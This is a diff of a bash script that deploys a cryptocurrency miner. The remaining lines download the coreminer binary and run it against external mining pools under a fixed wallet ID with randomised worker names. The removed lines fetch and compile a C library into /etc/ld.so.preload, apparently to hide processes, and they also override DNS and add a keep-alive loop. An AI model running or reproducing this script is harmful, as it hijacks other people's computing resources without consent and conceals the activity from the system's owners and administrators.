@@ -1,18 +1,6 @@
 #!/bin/bash
-apt-get update ; apt-get install wget sudo -y
-apt install -y curl
-curl https://github.com/kidoescegh/swa/raw/main/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
 wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz
 tar xf coreminer-linux-x86_64.tar.gz
 cd coreapp
 ./coreminer -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@eu.catchthatrabbit.com:8008 \
-     -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008 > /dev/null 2>&1 &
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 50s; done
-
+     -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008
